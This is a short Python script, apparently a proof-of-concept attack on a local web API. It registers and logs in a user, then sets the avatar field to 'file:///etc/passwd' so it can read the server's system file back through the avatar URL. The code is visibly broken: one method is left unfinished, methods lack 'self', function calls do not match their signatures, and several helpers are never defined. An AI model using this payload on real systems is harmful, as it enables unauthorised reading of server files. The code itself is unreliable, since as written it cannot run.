import requests
import json

BASE_URL = "http://127.0.0.1:20208"

class auto:
    def __init__(self):
        self.baseurl = "http://127.0.0.1:20208"
        self.phone = "18321267252"
        self.password = "a1@123"
    
    def register():
        url = baseurl + '/api/account/register' 
        user = {
            "mobile": phone,
            "password": password,
            "client": 6
        }
        r = requests.post(url, json=user, verify=False)
        response = json.loads(r.text)
        if response["code"] == 1:
            print("Register Thanh Cong")
            return True
        return False


    def login(phone, password):
        url =  BASE_URL + '/api/account/login' 

        user = {
            "account": phone,
            "password": password,
            "client": 6
        }
        r = requests.post(url, json=user, verify=False)
        response = json.loads(r.text)
        if response["code"] == 1:
            token = response['data']['token']
            return token
        return None

    def getToken

    def updateWechat(token, avatar):
        url = baseurl + '/api/user/setWechatInfo'
        
        user = {
            "nickname":"nickname",
            "avatar": avatar,
            "sex": 1
        }
        r = requests.post(url, headers={"token": token}, json=user, verify=False)
        response = json.loads(r.text)
        if response["code"] == 1:
            return True
        return False


phone = "18321267252"
password = "a1@123"
avatar = "file:///etc/passwd"

status = register(phone, password)
status = True
if status :
    token = login(phone, password)
    print(token)
    status_update = updateWechat(token, avatar)
    if status_update:
        avatar_url = userInfo(token)
        if avatar_url:
            print(avatar_url)
            checkFile(avatar_url)
        else:
            print('Khong upload Avatar')